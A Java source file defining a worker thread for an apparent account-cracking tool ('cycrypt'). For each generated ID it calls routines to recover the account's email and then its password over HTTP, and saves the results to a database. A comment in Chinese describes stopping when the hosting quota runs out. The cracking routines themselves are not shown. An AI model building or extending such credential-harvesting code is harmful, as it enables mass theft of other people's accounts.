package com.cycrypt.mission;


import org.apache.log4j.Logger;

import com.cycrypt.Config;
import com.cycrypt.Cracker;
import com.cycrypt.http.query.HttpQueryException;
import com.cycrypt.module.account.AccountManager;

public class CrackerThread implements Runnable {
	private Cracker c;
	private MHIDMaker idMaker;
	private boolean isRunning;
	private AccountManager accountManager ;
	private DoneCallBack callBack;
	private Config config;
	
	Logger log = Logger.getLogger(this.getClass());
	
	public CrackerThread( MHIDMaker idMaker,DoneCallBack callBack)
	{
		this.idMaker = idMaker;
		this.c = new Cracker();
		this.isRunning = true;
		this.accountManager = new AccountManager();
		this.callBack = callBack;
		config = Config.getInstance();
	}

	@Override
	public void run() {
		// TODO Auto-generated method stub
		while(isRunning&&CrackerMissionController.runningFlag)
		{
			String cyId = idMaker.getNextMHID();
			if(isEmpty(cyId))
			{
				isRunning = false;
				log.debug("Null cyId getted, seems end.Thread end.");
				callBack.done();
				isRunning = false;
				break;
			}
			
			//System.out.println(cyId);
			
			String email = null;
			String pass = null;
			
			try{
				
				log.debug("start to crack email..("+cyId+")");
				email =c.crackEmail(cyId);
				log.debug("finish to crack email..("+cyId+")");
				pass = null;
				if(!isEmpty(email))
				{
					log.debug("start to crack pass..("+cyId+")");
					pass = c.crackPass(cyId, email);
					log.debug("finish to crack pass..("+cyId+")");
				}else
				{
					log.debug("email is null, pass cracking abort.("+cyId+")");
				}
				
			}catch(HttpQueryException qe)
			{
				//SAE 环境下报出此错误 可能意味着FETCHURL 配额用完了，所以需要停掉线程
				if(config.getRunMode().equals(Config.RUN_MODE_TYPE_SAE))
				{
					log.error("RetchUrlException catched, stop current thread in SAE runmode");
					this.isRunning=false;
					//先不停掉THREADCONTROLLER
					return;
				}
			}
			
			log.debug("start to persistenting account..("+cyId+")");
			accountManager.insertAccount(cyId, email, pass);
			log.debug("finish to persistenting account..("+cyId+")");
			log.info(cyId);
		}
	}
	
	private boolean isEmpty(String str)
	{
		return str==null||str.trim().length()==0;
	}
	
}
